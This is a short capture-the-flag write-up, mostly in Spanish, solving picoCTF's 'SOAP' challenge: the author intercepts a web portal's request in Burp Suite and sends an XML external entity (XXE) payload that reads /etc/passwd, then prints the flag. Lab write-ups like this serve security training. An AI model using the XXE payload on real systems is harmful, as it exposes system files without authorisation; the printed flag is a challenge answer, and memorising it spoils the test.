## **Reto**: - SOAP
## **Descripción**
The web project was rushed and no security assessment was done. Can you read the /etc/passwd file? [Web Portal](http://saturn.picoctf.net:61377/)

## **Solución**
1. Lo primero que se hizo fue acceder al portal web y dentro  existen tres opciones de universidades para seleccionar.
2. Se revisó el código fuente de la página.
3. Después, se utilizó Burp Suite.
4. Se determinó que este escenario es ideal para una vulnerabilidad de tipo XXE.
5. Para probar la vulnerabilidad, se envió la petición al Repeater.
6. Luego utilizamos lo siguiente para así encontrar la bandera. 

`<?xml version="1.0" encoding="UTF-8"?>`
`<!DOCTYPE foo [`
`<!ENTITY xxe SYSTEM "file:///etc/passwd">`
`]>`
`<data><ID>&xxe;</ID></data>`

```
picoCTF{XML_3xtern@l_3nt1t1ty_55662c16}
```

## **Referencias
https://www.youtube.com/watch?v=b1pGlutUL34&list=PLDo9DMLZyP6kTZ8Td37-LdbAx4-yNfHBl&index=67